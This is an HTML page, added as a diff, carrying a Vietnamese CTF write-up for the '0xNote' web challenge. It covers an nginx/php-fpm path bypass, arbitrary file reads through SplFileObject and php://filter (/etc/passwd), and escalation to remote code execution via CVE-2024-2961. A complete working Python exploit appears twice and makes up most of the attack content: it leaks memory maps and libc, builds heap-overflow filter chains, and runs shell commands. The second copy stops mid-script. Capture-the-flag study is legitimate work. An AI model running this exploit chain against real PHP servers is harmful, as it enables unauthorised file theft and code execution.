@@ -1,0 +1,1660 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/p1c0L0.github.io/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=p1c0L0.github.io/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>OxL4ugh CTF | p1c0L0</title>
+<meta name="keywords" content="">
+<meta name="description" content="
+title: OxL4ugh CTF
+0xNote
+
+Overview
+
+Backend : fpm
+
+Proxy : nginx
+
+Giao diện
+
+Tuy nhiên bị chặn ở /premium.php
+
+Solve
+
+Với cách viết proxy như sau ta có thể bypass bằng việc thêm index.php ngay sau thư mục mà ta bị chặn (premium.php)
+
+Cách bypass ở đây
+Sau khi vào được /premium.php bằng /premium.php/index.php ta thấy được ứng dụng set color không fillter input người dùng
+Như đoạn code sau nếu có thể kiểm soát được color và note thì có thể tạo ra 1 object mới :
+
+
+Exploit
+
+CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì
+Set path : php://filter/convert.base64-encode/resource=/etc/passwd
+
+Set Classname
+
+Đọc kết quả
+
+Auket lấy được etc/passwd tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc
+
+
+Nâng quyền
+
+Ngay khi thực hiện được SPLFileObject như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ đoạn tài liệu sau và cái này
+
+Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào http://localhost:5000/ để check id
+
+import requests
+from pwn import *
+import re
+import base64
+import zlib
+from bs4 import BeautifulSoup
+
+session = requests.Session()
+
+## Constant
+
+HEAP_SIZE = 2 * 1024 * 1024
+BUG = &#34;劄&#34;.encode(&#34;utf-8&#34;)
+
+## Post init function
+
+def get_file(url, path):
+    path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+    r = session.post(url &#43; &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
+    r = session.post(url &#43; &#39;index.php&#39;, data={&#39;note&#39;:path})
+    r = session.post(url &#43; &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
+    r = session.get(url &#43; &#39;index.php&#39;)
+    soup = BeautifulSoup(r.text, &#34;html.parser&#34;)
+    data = soup.find(&#34;div&#34;, id=&#34;noteContent&#34;).get_text(strip=True)
+    return base64.b64decode(data)
+
+def compress(data):
+    return zlib.compress(data, 9)[2:-4]
+
+def compressed_bucket(data):
+    return chunked_chunk(data, 0x8000)
+
+def qpe(data):
+    return &#34;&#34;.join(f&#34;={x:02x}&#34; for x in data).upper().encode()
+
+def ptr_bucket(*ptrs, size=None):
+    if size is not None:
+        assert len(ptrs) * 8 == size
+    bucket = b&#34;&#34;.join(map(p64, ptrs))
+    bucket = qpe(bucket)
+    bucket = chunked_chunk(bucket)
+    bucket = chunked_chunk(bucket)
+    bucket = chunked_chunk(bucket)
+    bucket = compressed_bucket(bucket)
+    return bucket
+
+def chunked_chunk(data, size: int = None):
+    if size is None:
+        size = len(data) &#43; 8
+    keep = len(data) &#43; len(b&#34;\n\n&#34;)
+    size = f&#34;{len(data):x}&#34;.rjust(size - keep, &#34;0&#34;)
+    return size.encode() &#43; b&#34;\n&#34; &#43; data &#43; b&#34;\n&#34;
+
+## Pwn core
+
+class PWN_Core():
+    def __init__(self, url, command) -&gt; None:
+        self.url = url
+        self.command = command
+        self.info = {}
+        self.heap = None
+        self.pad = 20
+        
+    class Region():
+        def __init__(self, start, stop, permissions, path):
+            self.start = int(start)
+            self.stop = int(stop)
+            self.permissions = permissions
+            self.path = path
+        
+        @property
+        def size(self) -&gt; int:
+            return self.stop - self.start
+    
+    def download_file(self, remote_path: str, local_path: str) -&gt; None:
+        data = get_file(self.url, remote_path)
+        Path(local_path).write_bytes(data)
+    
+    def get_regions(self):
+        maps = get_file(self.url, &#34;/proc/self/maps&#34;)
+        maps = maps.decode()
+        PATTERN = re.compile(
+            r&#34;^([a-f0-9]&#43;)-([a-f0-9]&#43;)\b&#34; r&#34;.*&#34; r&#34;\s([-rwx]{3}[ps])\s&#34; r&#34;(.*)&#34;
+        )
+        regions = []
+        for region in [line.strip() for line in maps.strip().split(&#39;\n&#39;)]:
+            if match := PATTERN.match(region):
+                start = int(match.group(1), 16)
+                stop = int(match.group(2), 16)
+                permissions = match.group(3)
+                path = match.group(4)
+                if &#34;/&#34; in path or &#34;[&#34; in path:
+                    path = path.rsplit(&#34; &#34;, 1)[-1]
+                else:
+                    path = &#34;&#34;
+                current = self.Region(start, stop, permissions, path)
+                regions.append(current)
+                
+            else:
+                print(maps)
+        return regions
+
+    def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
+        for region in regions:
+            if any(name in region.path for name in names):
+                break
+        return region
+
+    def find_main_heap(self, regions):
+        heaps = [
+            region.stop - HEAP_SIZE &#43; 0x40
+            for region in reversed(regions)
+            if region.permissions == &#34;rw-p&#34;
+            and region.size &gt;= HEAP_SIZE
+            and region.stop &amp; (HEAP_SIZE-1) == 0
+            and region.path in (&#34;&#34;, &#34;[anon:zend_alloc]&#34;)
+        ]
+        first = heaps[0]
+        if len(heaps) &gt; 1:
+            heaps = &#34;, &#34;.join(map(hex, heaps))
+        return first
+
+    def get_symbols_and_addresses(self) -&gt; None:
+        regions = self.get_regions()
+        LIBC_FILE = &#34;./libc&#34;
+        self.info[&#34;heap&#34;] = self.find_main_heap(regions)
+        libc = self._get_region(regions, &#34;libc-&#34;, &#34;libc.so&#34;)
+        self.download_file(libc.path, LIBC_FILE)
+        self.info[&#34;libc&#34;] = ELF(LIBC_FILE, checksec=False)
+        self.info[&#34;libc&#34;].address = libc.start
+
+    def build_exploit_path(self):
+        
+        self.get_symbols_and_addresses()
+        
+        LIBC = self.info[&#34;libc&#34;]
+        ADDR_EMALLOC = LIBC.symbols[&#34;__libc_malloc&#34;]
+        ADDR_EFREE = LIBC.symbols[&#34;__libc_system&#34;]
+        ADDR_EREALLOC = LIBC.symbols[&#34;__libc_realloc&#34;]
+        ADDR_HEAP = self.info[&#34;heap&#34;]
+        ADDR_FREE_SLOT = ADDR_HEAP &#43; 0x20
+        ADDR_CUSTOM_HEAP = ADDR_HEAP &#43; 0x0168
+        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
+        CS = 0x100
+
+        pad_size = CS - 0x18
+        pad = b&#34;\x00&#34; * pad_size
+        pad = chunked_chunk(pad, len(pad) &#43; 6)
+        pad = chunked_chunk(pad, len(pad) &#43; 6)
+        pad = chunked_chunk(pad, len(pad) &#43; 6)
+        pad = compressed_bucket(pad)
+
+        step1_size = 1
+        step1 = b&#34;\x00&#34; * step1_size
+        step1 = chunked_chunk(step1)
+        step1 = chunked_chunk(step1)
+        step1 = chunked_chunk(step1, CS)
+        step1 = compressed_bucket(step1)
+        
+        step2_size = 0x48
+        step2 = b&#34;\x00&#34; * (step2_size &#43; 8)
+        step2 = chunked_chunk(step2, CS)
+        step2 = chunked_chunk(step2)
+        step2 = compressed_bucket(step2)
+
+        step2_write_ptr = b&#34;0\n&#34;.ljust(step2_size, b&#34;\x00&#34;) &#43; p64(ADDR_FAKE_BIN)
+        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
+        step2_write_ptr = chunked_chunk(step2_write_ptr)
+        step2_write_ptr = compressed_bucket(step2_write_ptr)
+
+        step3_size = CS
+        step3 = b&#34;\x00&#34; * step3_size
+        assert len(step3) == CS
+        step3 = chunked_chunk(step3)
+        step3 = chunked_chunk(step3)
+        step3 = chunked_chunk(step3)
+        step3 = compressed_bucket(step3)
+
+        step3_overflow = b&#34;\x00&#34; * (step3_size - len(BUG)) &#43; BUG
+        assert len(step3_overflow) == CS
+        step3_overflow = chunked_chunk(step3_overflow)
+        step3_overflow = chunked_chunk(step3_overflow)
+        step3_overflow = chunked_chunk(step3_overflow)
+        step3_overflow = compressed_bucket(step3_overflow)
+
+        step4_size = CS
+        step4 = b&#34;=00&#34; &#43; b&#34;\x00&#34; * (step4_size - 1)
+        step4 = chunked_chunk(step4)
+        step4 = chunked_chunk(step4)
+        step4 = chunked_chunk(step4)
+        step4 = compressed_bucket(step4)
+        
+        step4_pwn = ptr_bucket(
+            0x200000,
+            0,
+            # free_slot
+            0,
+            0,
+            ADDR_CUSTOM_HEAP,  # 0x18
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            ADDR_HEAP,  # 0x140
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            size=CS,
+        )
+
+        step4_custom_heap = ptr_bucket(
+            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
+        )
+        
+        step4_use_custom_heap_size = 0x140
+        
+        COMMAND = self.command
+        COMMAND = f&#34;kill -9 $PPID; {COMMAND}&#34;
+        COMMAND = COMMAND.encode() &#43; b&#34;\x00&#34;
+
+        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&#34;\x00&#34;)
+
+        step4_use_custom_heap = COMMAND
+        step4_use_custom_heap = qpe(step4_use_custom_heap)
+        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
+        
+        pages = (
+            step4 * 3
+            &#43; step4_pwn
+            &#43; step4_custom_heap
+            &#43; step4_use_custom_heap
+            &#43; step3_overflow
+            &#43; pad * self.pad
+            &#43; step1 * 3
+            &#43; step2_write_ptr
+            &#43; step2 * 2
+        )
+        
+        resource = compress(compress(pages))
+        resource = base64.b64encode(resource).decode()
+        resource = f&#34;data:text/plain;base64,{resource}&#34;
+        
+        filters = [
+            # Create buckets
+            &#34;zlib.inflate&#34;,
+            &#34;zlib.inflate&#34;,
+            
+            # Step 0: Setup heap
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+            
+            # Step 1: Reverse FL order
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+            
+            # Step 2: Put fake pointer and make FL order back to normal
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+            
+            # Step 3: Trigger overflow
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&#34;,
+            
+            # Step 4: Allocate at arbitrary address and change zend_mm_heap
+            &#34;convert.quoted-printable-decode&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+        ]
+        filters = &#34;|&#34;.join(filters)
+        path = f&#34;php://filter/read={filters}/resource={resource}&#34;
+        return path
+
+def solve():
+    URL = &#39;http://localhost:5000/&#39;
+    
+    command = &#39;id &gt; /tmp/check_id&#39;
+    
+    print(f&#39;[&#43;] Build payload với lệnh: {command}&#39;)
+    path = PWN_Core(URL, command).build_exploit_path()
+    
+    # 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)
+    try:
+        print(&#39;[*] Đang gửi payload kích hoạt RCE...&#39;)
+        # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi
+        # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi
+        
+        # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file
+        exploit_payload = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+        session.post(URL &#43; &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
+        session.post(URL &#43; &#39;index.php&#39;, data={&#39;note&#39;: exploit_payload})
+        session.post(URL &#43; &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
+        session.get(URL &#43; &#39;index.php&#39;, timeout=5) # Kích hoạt exploit
+        
+    except Exception as e:
+        # Lỗi 502 hoặc timeout là dấu hiệu tốt (server đang xử lý/crash do exploit)
+        print(f&#39;[!] Server phản hồi/crash (điều này là bình thường với CVE-2024-2961): {e}&#39;)
+    
+    # 3. Đợi hệ thống đồng bộ file
+    import time
+    print(&#39;[*] Đợi 2 giây để lệnh thực thi xong...&#39;)
+    time.sleep(2)
+    
+    # 4. Đọc kết quả từ file /tmp/check_id bằng LFI (Sử dụng lại hàm get_file)
+    print(&#39;[*] Đang đọc kết quả từ /tmp/check_id...&#39;)
+    try:
+        # Dùng chính tính năng SplFileObject để đọc file kết quả
+        result = get_file(URL, &#34;/tmp/check_id&#34;)
+        
+        if result:
+            print(&#39;\n[&#43;] KẾT QUẢ COMMAND ID:&#39;)
+            print(&#39;=&#39;*40)
+            print(result.decode(&#39;utf-8&#39;).strip())
+            print(&#39;=&#39;*40)
+        else:
+            print(&#39;[-] Không đọc được kết quả. Có thể exploit chưa thành công.&#39;)
+            
+    except Exception as e:
+        print(f&#39;[-] Lỗi khi đọc file kết quả: {e}&#39;)
+
+if __name__ == &#34;__main__&#34;:
+    solve()
+">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/0xnote/">
+<link crossorigin="anonymous" href="/p1c0L0.github.io/assets/css/stylesheet.76a739ec9e19c0128deb6be5591d168c8e3b9a8640e14dc34a2f248f674ef884.css" integrity="sha256-dqc57J4ZwBKN62vlWR0WjI47moZA4U3DSi8kj2dO&#43;IQ=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/p1c0L0.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/p1c0L0.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/p1c0L0.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/p1c0L0.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/p1c0L0.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p1c0L0.github.io/ctf/writeups/0xnote/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><link rel="icon" type="image/png" sizes="32x32" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="shortcut icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="apple-touch-icon" href="https://dotamduc.github.io/p1c0L0.github.io/favicon.png">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/p1c0L0.github.io/" accesskey="h" title="p1c0L0 (Alt + H)">p1c0L0</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/ctf/" title="CTF">
+                    <span>CTF</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/p1c0L0.github.io/contact/" title="Contact">
+                    <span>Contact</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      OxL4ugh CTF
+    </h1>
+    <div class="post-meta">
+
+</div>
+  </header> 
+  <div class="post-content"><hr>
+<h2 id="title-oxl4ugh-ctf">title: OxL4ugh CTF<a hidden class="anchor" aria-hidden="true" href="#title-oxl4ugh-ctf">#</a></h2>
+<h1 id="0xnote">0xNote<a hidden class="anchor" aria-hidden="true" href="#0xnote">#</a></h1>
+<p><img alt="image" loading="lazy" src="https://hackmd.io/_uploads/ryOk1sVIWx.png"></p>
+<h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<ul>
+<li>Backend : <strong>fpm</strong>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJSBJj4U-l.png"></li>
+<li>Proxy : <strong>nginx</strong>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/HkQCko4LZl.png"></li>
+<li>Giao diện
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SkCqlsE8be.png"></li>
+<li>Tuy nhiên bị chặn ở <code>/premium.php</code></li>
+</ul>
+<h2 id="solve">Solve<a hidden class="anchor" aria-hidden="true" href="#solve">#</a></h2>
+<ul>
+<li>Với cách viết proxy như sau ta có thể bypass bằng việc thêm <code>index.php</code> ngay sau thư mục mà ta bị chặn (<code>premium.php</code>)
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/BkGVeoVI-x.png"></li>
+<li><a href="https://angelica.gitbook.io/hacktricks/pentesting-web/proxy-waf-protections-bypass#php-fpm">Cách bypass ở đây</a></li>
+<li>Sau khi vào được <code>/premium.php</code> bằng <code>/premium.php/index.php</code> ta thấy được ứng dụng set color không fillter input người dùng</li>
+<li>Như đoạn code sau nếu có thể kiểm soát được <code>color</code> và <code>note</code> thì có thể tạo ra 1 object mới :
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rkKAWiNL-e.png"></li>
+</ul>
+<h2 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h2>
+<ul>
+<li>CHúng ta sẽ dùng SPLFileObject để đọc 1 file bất kì</li>
+<li>Set path : <code>php://filter/convert.base64-encode/resource=/etc/passwd</code>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/Sy_7VjNUZx.png"></li>
+<li>Set Classname
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/H1PwVjEIWl.png"></li>
+<li>Đọc kết quả
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rkbq4sV8Wx.png"></li>
+<li>Auket lấy được <code>etc/passwd</code> tuy nhiên flag có quyền Owner vậy nên chưa đủ quyền để đọc
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/rJzRNiVUZg.png"></li>
+</ul>
+<h3 id="nâng-quyền">Nâng quyền<a hidden class="anchor" aria-hidden="true" href="#nâng-quyền">#</a></h3>
+<ul>
+<li>Ngay khi thực hiện được <code>SPLFileObject</code> như ở trên ta cũng có thể biến thể để nâng lên từ đọc file thành RCE từ <a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">đoạn tài liệu sau</a> và <a href="https://blog.lexfo.fr/iconv-cve-2024-2961-p1.html">cái này</a>
+<img alt="image" loading="lazy" src="https://hackmd.io/_uploads/SJfsHsVIZl.png"></li>
+<li>Sau đây sẽ là PWN CORE , mình đéo biết giải thích như nào nên chạy code thôi ; Vào <code>http://localhost:5000/</code> để check id</li>
+</ul>
+<pre tabindex="0"><code class="language-php=" data-lang="php=">import requests
+from pwn import *
+import re
+import base64
+import zlib
+from bs4 import BeautifulSoup
+
+session = requests.Session()
+
+## Constant
+
+HEAP_SIZE = 2 * 1024 * 1024
+BUG = &#34;劄&#34;.encode(&#34;utf-8&#34;)
+
+## Post init function
+
+def get_file(url, path):
+    path = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+    r = session.post(url + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
+    r = session.post(url + &#39;index.php&#39;, data={&#39;note&#39;:path})
+    r = session.post(url + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
+    r = session.get(url + &#39;index.php&#39;)
+    soup = BeautifulSoup(r.text, &#34;html.parser&#34;)
+    data = soup.find(&#34;div&#34;, id=&#34;noteContent&#34;).get_text(strip=True)
+    return base64.b64decode(data)
+
+def compress(data):
+    return zlib.compress(data, 9)[2:-4]
+
+def compressed_bucket(data):
+    return chunked_chunk(data, 0x8000)
+
+def qpe(data):
+    return &#34;&#34;.join(f&#34;={x:02x}&#34; for x in data).upper().encode()
+
+def ptr_bucket(*ptrs, size=None):
+    if size is not None:
+        assert len(ptrs) * 8 == size
+    bucket = b&#34;&#34;.join(map(p64, ptrs))
+    bucket = qpe(bucket)
+    bucket = chunked_chunk(bucket)
+    bucket = chunked_chunk(bucket)
+    bucket = chunked_chunk(bucket)
+    bucket = compressed_bucket(bucket)
+    return bucket
+
+def chunked_chunk(data, size: int = None):
+    if size is None:
+        size = len(data) + 8
+    keep = len(data) + len(b&#34;\n\n&#34;)
+    size = f&#34;{len(data):x}&#34;.rjust(size - keep, &#34;0&#34;)
+    return size.encode() + b&#34;\n&#34; + data + b&#34;\n&#34;
+
+## Pwn core
+
+class PWN_Core():
+    def __init__(self, url, command) -&gt; None:
+        self.url = url
+        self.command = command
+        self.info = {}
+        self.heap = None
+        self.pad = 20
+        
+    class Region():
+        def __init__(self, start, stop, permissions, path):
+            self.start = int(start)
+            self.stop = int(stop)
+            self.permissions = permissions
+            self.path = path
+        
+        @property
+        def size(self) -&gt; int:
+            return self.stop - self.start
+    
+    def download_file(self, remote_path: str, local_path: str) -&gt; None:
+        data = get_file(self.url, remote_path)
+        Path(local_path).write_bytes(data)
+    
+    def get_regions(self):
+        maps = get_file(self.url, &#34;/proc/self/maps&#34;)
+        maps = maps.decode()
+        PATTERN = re.compile(
+            r&#34;^([a-f0-9]+)-([a-f0-9]+)\b&#34; r&#34;.*&#34; r&#34;\s([-rwx]{3}[ps])\s&#34; r&#34;(.*)&#34;
+        )
+        regions = []
+        for region in [line.strip() for line in maps.strip().split(&#39;\n&#39;)]:
+            if match := PATTERN.match(region):
+                start = int(match.group(1), 16)
+                stop = int(match.group(2), 16)
+                permissions = match.group(3)
+                path = match.group(4)
+                if &#34;/&#34; in path or &#34;[&#34; in path:
+                    path = path.rsplit(&#34; &#34;, 1)[-1]
+                else:
+                    path = &#34;&#34;
+                current = self.Region(start, stop, permissions, path)
+                regions.append(current)
+                
+            else:
+                print(maps)
+        return regions
+
+    def _get_region(self, regions: list[Region], *names: str) -&gt; Region:
+        for region in regions:
+            if any(name in region.path for name in names):
+                break
+        return region
+
+    def find_main_heap(self, regions):
+        heaps = [
+            region.stop - HEAP_SIZE + 0x40
+            for region in reversed(regions)
+            if region.permissions == &#34;rw-p&#34;
+            and region.size &gt;= HEAP_SIZE
+            and region.stop &amp; (HEAP_SIZE-1) == 0
+            and region.path in (&#34;&#34;, &#34;[anon:zend_alloc]&#34;)
+        ]
+        first = heaps[0]
+        if len(heaps) &gt; 1:
+            heaps = &#34;, &#34;.join(map(hex, heaps))
+        return first
+
+    def get_symbols_and_addresses(self) -&gt; None:
+        regions = self.get_regions()
+        LIBC_FILE = &#34;./libc&#34;
+        self.info[&#34;heap&#34;] = self.find_main_heap(regions)
+        libc = self._get_region(regions, &#34;libc-&#34;, &#34;libc.so&#34;)
+        self.download_file(libc.path, LIBC_FILE)
+        self.info[&#34;libc&#34;] = ELF(LIBC_FILE, checksec=False)
+        self.info[&#34;libc&#34;].address = libc.start
+
+    def build_exploit_path(self):
+        
+        self.get_symbols_and_addresses()
+        
+        LIBC = self.info[&#34;libc&#34;]
+        ADDR_EMALLOC = LIBC.symbols[&#34;__libc_malloc&#34;]
+        ADDR_EFREE = LIBC.symbols[&#34;__libc_system&#34;]
+        ADDR_EREALLOC = LIBC.symbols[&#34;__libc_realloc&#34;]
+        ADDR_HEAP = self.info[&#34;heap&#34;]
+        ADDR_FREE_SLOT = ADDR_HEAP + 0x20
+        ADDR_CUSTOM_HEAP = ADDR_HEAP + 0x0168
+        ADDR_FAKE_BIN = ADDR_FREE_SLOT - 0x10
+        CS = 0x100
+
+        pad_size = CS - 0x18
+        pad = b&#34;\x00&#34; * pad_size
+        pad = chunked_chunk(pad, len(pad) + 6)
+        pad = chunked_chunk(pad, len(pad) + 6)
+        pad = chunked_chunk(pad, len(pad) + 6)
+        pad = compressed_bucket(pad)
+
+        step1_size = 1
+        step1 = b&#34;\x00&#34; * step1_size
+        step1 = chunked_chunk(step1)
+        step1 = chunked_chunk(step1)
+        step1 = chunked_chunk(step1, CS)
+        step1 = compressed_bucket(step1)
+        
+        step2_size = 0x48
+        step2 = b&#34;\x00&#34; * (step2_size + 8)
+        step2 = chunked_chunk(step2, CS)
+        step2 = chunked_chunk(step2)
+        step2 = compressed_bucket(step2)
+
+        step2_write_ptr = b&#34;0\n&#34;.ljust(step2_size, b&#34;\x00&#34;) + p64(ADDR_FAKE_BIN)
+        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)
+        step2_write_ptr = chunked_chunk(step2_write_ptr)
+        step2_write_ptr = compressed_bucket(step2_write_ptr)
+
+        step3_size = CS
+        step3 = b&#34;\x00&#34; * step3_size
+        assert len(step3) == CS
+        step3 = chunked_chunk(step3)
+        step3 = chunked_chunk(step3)
+        step3 = chunked_chunk(step3)
+        step3 = compressed_bucket(step3)
+
+        step3_overflow = b&#34;\x00&#34; * (step3_size - len(BUG)) + BUG
+        assert len(step3_overflow) == CS
+        step3_overflow = chunked_chunk(step3_overflow)
+        step3_overflow = chunked_chunk(step3_overflow)
+        step3_overflow = chunked_chunk(step3_overflow)
+        step3_overflow = compressed_bucket(step3_overflow)
+
+        step4_size = CS
+        step4 = b&#34;=00&#34; + b&#34;\x00&#34; * (step4_size - 1)
+        step4 = chunked_chunk(step4)
+        step4 = chunked_chunk(step4)
+        step4 = chunked_chunk(step4)
+        step4 = compressed_bucket(step4)
+        
+        step4_pwn = ptr_bucket(
+            0x200000,
+            0,
+            # free_slot
+            0,
+            0,
+            ADDR_CUSTOM_HEAP,  # 0x18
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            ADDR_HEAP,  # 0x140
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            0,
+            size=CS,
+        )
+
+        step4_custom_heap = ptr_bucket(
+            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=0x18
+        )
+        
+        step4_use_custom_heap_size = 0x140
+        
+        COMMAND = self.command
+        COMMAND = f&#34;kill -9 $PPID; {COMMAND}&#34;
+        COMMAND = COMMAND.encode() + b&#34;\x00&#34;
+
+        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, b&#34;\x00&#34;)
+
+        step4_use_custom_heap = COMMAND
+        step4_use_custom_heap = qpe(step4_use_custom_heap)
+        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)
+        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)
+        
+        pages = (
+            step4 * 3
+            + step4_pwn
+            + step4_custom_heap
+            + step4_use_custom_heap
+            + step3_overflow
+            + pad * self.pad
+            + step1 * 3
+            + step2_write_ptr
+            + step2 * 2
+        )
+        
+        resource = compress(compress(pages))
+        resource = base64.b64encode(resource).decode()
+        resource = f&#34;data:text/plain;base64,{resource}&#34;
+        
+        filters = [
+            # Create buckets
+            &#34;zlib.inflate&#34;,
+            &#34;zlib.inflate&#34;,
+            
+            # Step 0: Setup heap
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+            
+            # Step 1: Reverse FL order
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+            
+            # Step 2: Put fake pointer and make FL order back to normal
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+            
+            # Step 3: Trigger overflow
+            &#34;dechunk&#34;,
+            &#34;convert.iconv.UTF-8.ISO-2022-CN-EXT&#34;,
+            
+            # Step 4: Allocate at arbitrary address and change zend_mm_heap
+            &#34;convert.quoted-printable-decode&#34;,
+            &#34;convert.iconv.L1.L1&#34;,
+        ]
+        filters = &#34;|&#34;.join(filters)
+        path = f&#34;php://filter/read={filters}/resource={resource}&#34;
+        return path
+
+def solve():
+    URL = &#39;http://localhost:5000/&#39;
+    
+    command = &#39;id &gt; /tmp/check_id&#39;
+    
+    print(f&#39;[+] Build payload với lệnh: {command}&#39;)
+    path = PWN_Core(URL, command).build_exploit_path()
+    
+    # 2. Gửi Exploit (Chấp nhận lỗi 502/Server Crash)
+    try:
+        print(&#39;[*] Đang gửi payload kích hoạt RCE...&#39;)
+        # Bước này server có thể trả về 502 do tiến trình crash, ta dùng try/except để bỏ qua lỗi
+        # Lưu ý: Không gọi get_file ở đây để đọc kết quả ngay, vì hàm get_file sẽ fail khi parse HTML lỗi
+        
+        # Tự gửi request thủ công để tránh logic parse HTML của hàm get_file
+        exploit_payload = f&#34;php://filter/convert.base64-encode/resource={path}&#34;
+        session.post(URL + &#39;login.php&#39;, data={&#39;username&#39;:&#39;winky&#39;})
+        session.post(URL + &#39;index.php&#39;, data={&#39;note&#39;: exploit_payload})
+        session.post(URL + &#39;/premium.php/index.php&#39;, data={&#39;color&#39;: &#39;SplFileObject&#39;})
+        session.get(URL + &#39;index.php&#39;, timeout=5) # Kích hoạt exploit
+        
